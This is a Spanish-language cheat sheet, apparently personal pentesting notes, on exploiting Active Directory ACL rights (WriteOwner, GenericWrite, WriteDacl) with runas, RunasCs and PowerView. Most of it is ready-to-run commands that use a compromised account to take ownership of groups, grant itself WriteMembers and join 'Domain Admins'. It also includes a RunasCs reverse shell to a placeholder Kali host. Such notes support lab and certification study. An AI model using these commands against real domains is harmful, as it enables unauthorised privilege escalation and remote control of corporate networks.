# Explotación de ACLs 

Tags: #AD #ACL #Powershell #SwitchUsers #Windows #PowerView 

```bash 
Se pueden ver las ACLs en la herramienta de BloodHound. 
```

```bash 
1. Si se ha comprometido un usuario y nos encontramos en un entorno Windows, nos podemos autenticar con ese otro usuario utilizando  runas en 'Powershell'  (Mejor opción)
❯ runas /user:domain\user2 /netonly powershell         # Abrir una terminal powershell con autenticación local como el usuario host 'user1' y a manera de servicios de red estar autenticados como 'user2' 

2. También, se puede utilizar ese usuario con una 'PowerShell' para hacer una autenticacion de red de la siguiente manera: 
		- En Windows 11 ir a Menú, buscar 'Powershell' y dar click derecho y seleccionar 'Open File Location'
		- En el simbolo de 'Powershell' dar 'Shift + click derecho' y seleccionar 'Run as different user'
		- Colocar las credenciales válidas de otro usuario para obtener una consola 
```

## WriteOwner

* [RunasCs](https://github.com/antonioCoco/RunasCs/releases/tag/v1.5)

```powershell 
❯ .\RunasCs.exe Administrator password123 "cmd.exe"
# Ejecutar una reverse shell a Kali 
❯ .\RunasCs.exe Administrator password123 "cmd.exe" -r IP_Kali:443 

❯ .\RunasCs.exe Administrator password123 "powershell.exe" 
❯ .\RunasCs.exe Administrator password123 "powershell.exe" -l 9
	# -l 9 = Mismo comportamiento que '/netonly'

# Ejecutar un comando 
❯ .\RunasCs.exe corp\administrator Password123 "cmd.exe /c whoami"
```

```powershell  
Primero se hace la autenticación en Windows con el usuario comprometido y en cada actualización se debe de renovar el token para tener los privilegios actualizados. Lo que significa que se debe de volver a iniciar sesión en Powershell con Runas.

❯ runas /user:domain\user2 /netonly powershell         # Abrir una terminal powershell con autenticación local como el usuario host 'user1' y a manera de servicios de red estar autenticados como 'user2' 
```

```bash 
Pertenecer a un grupo que tenga el privilegio 'WriteOwner' sobre otro objeto (por ejemplo, otro grupo en Active Directory) implica la capacidad de modificar el atributo `owner` del objeto objetivo.

En Active Directory, el owner de un objeto tiene derechos implícitos especiales:
	- Puede modificar la DACL del objeto, incluso si actualmente no tiene permisos explícitos en ella.
	- Puede concederse a sí mismo derechos adicionales (por ejemplo GenericAll, WriteMembers, etc.).
	- Puede agregar nuevos usuarios al grupo.
	  
Por lo tanto:
Si un usuario puede cambiar el `owner` de un grupo, puede convertirse en propietario del grupo y, como propietario, modificar su DACL para otorgarse permisos completos sobre ese grupo.
```

```powershell 
# Utilizar PowerView y asignar 'user2' como owner al grupo 'Project Management' para añadir una ACL
❯ Set-DomainObjectOwner -Identity "Project Management" -OwnerIdentity user2 

# Anadir la ACL para que el usuario 'user2' pueda ejecutar un privilegio especial   
❯ Add-DomainObjectAcl -TargetIdentity "Project Management" -Rights WriteMembers -PrincipalIdentity user2 

# Añadirnos a nosotros mismos para pertenecer al grupo 'Project Management' 
❯ Add-DomainGroupMember -Identity "Project Management" -Members user2
```

## GenericWrite 

```powershell 
Primero se hace la autenticación en Windows con el usuario comprometido y en cada actualización se debe de renovar el token para tener los privilegios actualizados. Lo que significa que se debe de volver a iniciar sesión en Powershell con Runas.

❯ runas /user:domain\user2 /netonly powershell         # Abrir una terminal powershell con autenticación local como el usuario host 'user1' y a manera de servicios de red estar autenticados como 'user2' 
```

```bash 
Pertenecer a un grupo que tenga el privilegio GenericWrite sobre otro objeto (por ejemplo, otro grupo en Active Directory) implica la capacidad de modificar atributos no protegidos del objeto objetivo.

En Active Directory, el permiso GenericWrite permite escritura sobre múltiples atributos del objeto, dependiendo de su clase.

Si un usuario tiene GenericWrite sobre un grupo, puede:
1. Modificar atributos como:
	- description
	- displayName
	- mail
	- otros atributos no críticos

2. Si el atributo member no está protegido explícitamente, puede:
	- Agregar nuevos miembros al grupo directamente 
	- Eliminar miembros existentes
```

```powershell 
# Utilizar PowerView y añadirnos a nosotros mismos para pertenecer al grupo 'Office Admin' 
❯ Add-DomainGroupMember -Identity "Office Admin" -Members user2
```

## WriteDacl 

```powershell 
Primero se hace la autenticación en Windows con el usuario comprometido y en cada actualización se debe de renovar el token para tener los privilegios actualizados. Lo que significa que se debe de volver a iniciar sesión en Powershell con Runas.

❯ runas /user:domain\user2 /netonly powershell         # Abrir una terminal powershell con autenticación local como el usuario host 'user1' y a manera de servicios de red estar autenticados como 'user2' 
```

```bash 
Pertenecer a un grupo que tenga el privilegio WriteDACL sobre otro objeto (por ejemplo, un grupo en Active Directory) implica la capacidad de modificar la DACL (Discretionary Access Control List) del objeto objetivo.

En Active Directory, la DACL define quién puede hacer qué sobre un objeto.

Si un usuario tiene WriteDACL sobre un grupo, puede:
1. Agregar nuevas ACEs (Access Control Entries)
2. Modificar permisos existentes
3. Otorgarse a sí mismo permisos adicionales como:
	- GenericAll
	- WriteMembers
	- WriteOwner
	- GenericWrite
4. Otorgar permisos a otros usuarios o grupos
```

```powershell 
# Utilizar PowerView y anadir la ACL para que el usuario 'user2' pueda ejecutar un privilegio especial  
❯ Add-DomainObjectAcl -TargetIdentity "Domain Admins" -Rights WriteMembers -PrincipalIdentity user2 

# Añadirnos a nosotros mismos para pertenecer al grupo 'Domain Admins' 
❯ Add-DomainGroupMember -Identity "Domain Admins" -Members user2
```